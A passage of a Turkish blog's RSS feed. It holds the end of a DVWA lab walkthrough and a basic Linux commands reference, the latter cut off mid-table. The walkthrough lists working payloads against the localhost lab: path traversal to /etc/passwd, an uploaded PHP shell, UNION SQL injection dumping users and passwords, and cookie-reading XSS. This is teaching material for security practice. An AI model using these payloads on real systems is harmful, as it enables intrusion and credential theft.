&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;AUTOCOMPLETE=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;off&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password_conf&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ctr1l&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Change&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Change&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Bu kodu tarayıcımızda çalıştırdığımızda asıl şifre değiştirme formumuzu doldurduğunu ve şifrenin değiştirildiğini görüyoruz.&lt;/p&gt;

&lt;h4&gt;File Inclusion&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://localhost/DVWA-master/vulnerabilities/fi/?page=/etc/passwd
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Tarayıcıdan yazdığımızda  önümüzde /etc/passwd dosyası açılıyor.
Deneyerek dizinler arası dolaşarak farklı dosyalara ulaşabiliriz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://localhost/DVWA-master/vulnerabilities/fi/?page=../../../../../../var/www/html/index.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4&gt;File Upload&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. &amp;lt;?php echo shell_exec('cat /etc/passwd')  ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Bu kodu içeren dosyayı upload edip sisteme kendi php sayfamızı yüklemiş oluyoruz. Çeşitli işlemler yapacak sayfayı
oluşturmak bize kalıyor. Bu ssayfaya gidecek olursak passwd dosyasının içeriğini görebiliriz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://localhost/DVWA-master/hackable/uploads/shell.php
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4&gt;SQL Injection&lt;/h4&gt;

&lt;p&gt;      Boş alana ‘or 1 or’ yaptıktan sonra sorgu inject edebileceğimizi anlıyoruz ve tüm isimleri listeliyoruz.&lt;/p&gt;

&lt;p&gt;      Sonrasında kaç tane sütunumuz olduğunu anlamak için &lt;strong&gt;‘order by 1 #, ‘order by 2 # , ‘order by 3 # &lt;/strong&gt;
ifadelerini denerken 3’te hata alıyoruz. Buradan içeride 2 tane sütunumuz olduğunu anlıyoruz.
Bundan sonraki ifadelerimizi buna göre yazacağız.&lt;/p&gt;

&lt;p&gt;      Önce &lt;strong&gt;database&lt;/strong&gt; ve &lt;strong&gt;versiyon&lt;/strong&gt; bilgisi için şu sorguyu gönderiyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 'union select database(),version() 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/sqli/database-version.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      &lt;strong&gt;Tablo&lt;/strong&gt; bilgileri için şu sorguyu gönderiyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 'union select table_name,2 from information_schema.tables #
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/sqli/tables.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      &lt;strong&gt;Kullanıcı bilgileri&lt;/strong&gt; için gönderdiğimiz sorgu da şu şekilde :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 'union select user,password from users #
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/sqli/users.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      Bu şekilde devam ederek çeşitli bilgileri edinebiliriz.&lt;/p&gt;

&lt;h4&gt;XSS (Reflected)&lt;/h4&gt;

&lt;p&gt;      Gelecek olan tepkiyi görmek için şöyle bir betik yolluyoruz. Buradan gelen &lt;strong&gt;‘HELLO’&lt;/strong&gt; mesajından da anlayacağımız üzere kodlarımızı çalıştırabileceğimizi anlıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. &amp;lt;script&amp;gt;alert(&quot;Ctr1l&quot;)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4&gt;XSS (Stored)&lt;/h4&gt;

&lt;p&gt;      Reflected kısmındaki gibi bir denemeyle kod çalıştırabileceğimizi anlıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Artık kodumuz içeride saklanıyor. Her ekleme yapmak istediğimizde ekleme işleminin yanında o  kodumuz da çalışacak ve  verilen görevi yapacak.&lt;/p&gt;

</description>
      </item>
    
      <item>
        <title>Temel Linux Komutları</title>
        <link>http://localhost:4000/basic-linux-komutlari</link>
        <pubDate>Tue, 21 Mar 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;mkdir&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;dizin oluşturma&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;rmdir&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;dizin silme&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;ls&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;dosya ve dizin listeleme&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;cd&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;çalışma dizinin değiştirme&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;pwd&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;çalışma dizinini görüntüleme&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;touch&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;dosya erişim zamanını güncelleme&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;rm&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;dosya ve dizin silme&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;cp&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;dosya ve dizin kopyalama&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;mv&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;dosya ve dizin taşıma, isim değiştirme&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;file&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;dosya türünü öğrenme&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;find&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;dosya ve dizin arama&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;a-Çevrim-İçi-klavuz-sayfaları&quot;&gt;A. Çevrim İçi Klavuz Sayfaları&lt;/h3&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;man “komut_adı”&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Komutun kılavuz sayfasını çağırma&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;man –K directory, man –K board&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Kılavuz sayfalarında anahtar kelime aratma&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;b-haberleşme-komutları&quot;&gt;B. Haberleşme Komutları&lt;/h3&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;wall&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Sisteme bağlı tüm kullanıcılara anlık mesaj göndermek için kullanılır.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;mesg&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;“mesg y” komutu ile mesaj gönderme izni verilir.&lt;/td&gt;
      &lt;td&gt;“mesg n” komutu ile mesaj alımı kapatılabilir&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;write “write kullanici_adi”&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;komutu ile oturum açmış kullanıcıya mesaj gönderilebilir&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;“$&lt;strong&gt;write kullanici_adi” &lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;komutu ile sisteme o anda giriş yapmış bulunan kullanıcılara
mesaj gönderilebilir. Giriş yapmamış kullanıcılara mesaj göndermek için “mail
kullanici_adi” komutu ile e-posta gönderilebilir.&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;“$&lt;strong&gt;write kullanici_adi” &lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;komutu verildikten sonra iletilmesi istenen mesaj yazılabilir; mesaj
uygulamasını sonlandırmak için “Ctrl + D” tuş kombinasyonu kullanılabilir.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;c-etcmod&quot;&gt;C. etc/mod&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;NOT&lt;/strong&gt;: Kullanıcılar oturum açtıklarında görmeleri istenilen duyurular “/etc/motd”
dosyasına yazılmalıdır. motd (ing. Message Of The Day)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Kullanıcılar oturum açtıklarında “/etc/motd” dosyası görüntülenir. Duyuru mesajlarını
bu dosyaya yazarak sisteme giriş yapan herkesin ilgili mesajı görmesini
sağlayabilirsiniz.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;d-root&quot;&gt;D. root&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;UNIX sisteminizin en yetkili kullanıcısı “0” kullanıcı numarasına sahip olan
‘root’ tur&lt;/li&gt;
  &lt;li&gt;‘root’ kullanısının UNIX türevi dışındaki işletim sistemlerinde tam bir
karşılığı yoktur&lt;/li&gt;
  &lt;li&gt;‘root’ dışında, ftp, nobody, mail gibi özel tanımlı kullanıcılar da vardır&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;e-grup-ile-ilgili-komutlar&quot;&gt;E. Grup ile ilgili komutlar&lt;/h3&gt;

&lt;p&gt;UNIX’te tüm kullanıcılar en az bir kullanıcı grubunun üyesidirler&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Bilgisayar kaynaklarına grup bazında erişim denetimi de mümkündür&lt;/li&gt;
  &lt;li&gt;Grup bilgileri /etc/group dosyasında tutulur&lt;/li&gt;
  &lt;li&gt;Grup parolaları /etc/gshadow dosyasında tutulur&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;groupadd&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Yeni bir çalışma gurubu oluşturmak için&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;groupdel&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Mevcut bir bir çalışma grubu silmek için komutları kullanılır.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;gpasswd &lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Bir kullanıcıyı belli bir çalışma grubuna eklemek veya çıkarmak için kullanılır.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;who&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Sistemde çalışan kullanıcıları, sisteme giriş zamanları ile birlikte listelemektedir.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;w &lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Sistemde çalışan kullanıcıları ve hangi programları çalıştırdıklarını listelemektedir.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;passwd&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Parola değişikliği için kullanılır.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Sistemdeki kabuk alternatifleri /etc/shells dosyasında yazılıdır.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Kabuk değişikliği için chsh komutu kullanılır.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;finger&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Kullanıcı bilgileri arayıp görüntülenebilir.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;chfn&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Komutu ile kullanıcı bilgilerini değiştirilebilir.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;su&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Bir kullanıcının başka bir kullanıcının kimliğine bürünmesini sağlar.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;su (Switch User) – Bir kullanıcının başka bir kullanıcının kimliğine bürünmesini sağlar.
“-” parametresi kullanılırsa belirtilen kullanıcının başlangıç betiklerinin işletilmesi
sağlanır, “-” parametresi kullanılmazsa kullanıcının başlangıç betikleri işletilmez. Su
ile kullanıcı kimliği değiştirildikten sonra exit komutu ile kimlik eski durumuna
döndürülebilir.&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;sudo &lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Bir kullanıcının başka bir kullanıcının kimliği ile komut işletmesini sağlar.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;sudo – &lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Bir kullanıcının başka bir kullanıcı kimliği ile bir programı çalıştırmasını sağlar.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;“/etc/sudoers” dosyasındaki yetki tanımlarına uygun olarak kullanıcının programlar
çalıştırabilmesi sağlanır.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;erişim-yetkilerinin-incelenmesi&quot;&gt;Erişim yetkilerinin incelenmesi&lt;/h4&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;rwx&lt;/td&gt;
      &lt;td&gt;(okuma var, yazma var, çalıştırma var)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rw-&lt;/td&gt;
      &lt;td&gt;(okuma var, yazma var, çalıştırma yok)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;r–&lt;/td&gt;
      &lt;td&gt;(okuma var, yazma yok, çalıştırma yok)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;—&lt;/td&gt;
      &lt;td&gt;(okuma yok, yazma yok, çalıştırma yok)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–x&lt;/td&gt;
      &lt;td&gt;(okuma yok, yazma yok, çalıştırma var)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;erişim-yetkilerinin-düzenlenmesi&quot;&gt;Erişim Yetkilerinin Düzenlenmesi&lt;/h4&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$chmod [ugoa][+ – =][rwxst][, …] dosya/dizin&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;kim&quot;&gt;Kim?&lt;/h4&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;“g” –&lt;/td&gt;
      &lt;td&gt;grubun (group)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“a” –&lt;/td&gt;
      &lt;td&gt;her üçünün de (all)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“u” –&lt;/td&gt;
      &lt;td&gt;sahibinin (user)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“o” –&lt;/td&gt;
      &lt;td&gt;diğerlerinin (other)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;yetkilerinin düzenlenmesi&lt;/p&gt;

&lt;h4 id=&quot;İşleç&quot;&gt;İşleç&lt;/h4&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;“+” –&lt;/td&gt;
      &lt;td&gt;söz konusu yetkinin verilmesi&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“–” –&lt;/td&gt;
      &lt;td&gt;söz konusu yetkinin verilmemesi&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“=” –&lt;/td&gt;
      &lt;td&gt;sadece söz konusu yetkinin verilmesi&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;yetki&quot;&gt;Yetki&lt;/h4&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;“r” –&lt;/td&gt;
      &lt;td&gt;okuma yetkisi (read)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“w” –&lt;/td&gt;
      &lt;td&gt;yazma yetkisi (write)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“x” –&lt;/td&gt;
      &lt;td&gt;çalıştırma yetkisi (execute)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“s” –&lt;/td&gt;
      &lt;td&gt;sahibi olarak çalıştırma yetkisi (setuid, setgid)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“t” –&lt;/td&gt;
      &lt;td&gt;dizine özel yazma yetkisi (sticky)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h5 id=&quot;Örnek&quot;&gt;Örnek&lt;/h5&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;chmod ugo+x dosya.txt &lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Sahibine, gruba ve diğerlerine çalıştırma yetkisi verilmektedir. Son erişim yetkileri “rwxr-xr-x” olmaktadır.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;yetkilerin-düzenlenmesi-8-tabanı&quot;&gt;Yetkilerin düzenlenmesi (8 tabanı)&lt;/h4&gt;

&lt;p&gt;chmod sekiz_tabanında_yetki_sayısı dosya
“r” = 4, “w” = 2, “x” = 1, “-” = 0&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Dosyanın erişim yetkilerinin “rw-r—–” olması için yetki sayısının (4+2+0) (4+0+0)
(0+0+0) = 6 4 0 olması gerekir.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Yani şu şekilde de yazılabilir:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;chmod 640 dosya&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;f-disklerin-yönetilmesi&quot;&gt;F. Disklerin Yönetilmesi&lt;/h3&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;fdisk&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;gparted&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;g-dosya-sistemlerinin-bağlanması&quot;&gt;G. Dosya Sistemlerinin Bağlanması&lt;/h3&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;mount&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Dosya sistemini dizin altına bağlar.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;umount&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Bağlı olan dosya sistemini ayırır&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;h-disk-kullanım-bilgileri&quot;&gt;H. Disk Kullanım Bilgileri&lt;/h3&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;df -k&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;df(disk free)-Bağlanmış tüm dosya sistemlerinin doluluk bilgilerini göstermektedir.
Örnekte “-k” seçeneği ile değerlerin KB birimi ile gösterilmesi sağlanmıştır.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Dosya sistemlerinin kullanım bilgilerini verir.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;strong&gt;du -ks&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;du(disk usage)– “-k” seçeneği ile değerlerin KB birimi ile gösterilmesi, “-s” seçeneği
ile de sadece toplam kullanım bilgisinin gösterilmesi sağlanmıştır.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bir dizinin kullanım bilgilerini verir.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;i-girdi-Çıktı-yönlendirme&quot;&gt;I. Girdi Çıktı Yönlendirme&lt;/h3&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$program &amp;gt; dosya&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Bir programın çıktısını bir dosyaya yönlendirme .&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$program » dosya&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Bir program çıktısını mevcut olan bir dosyaya ekleme yaparak
yönlendirme&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
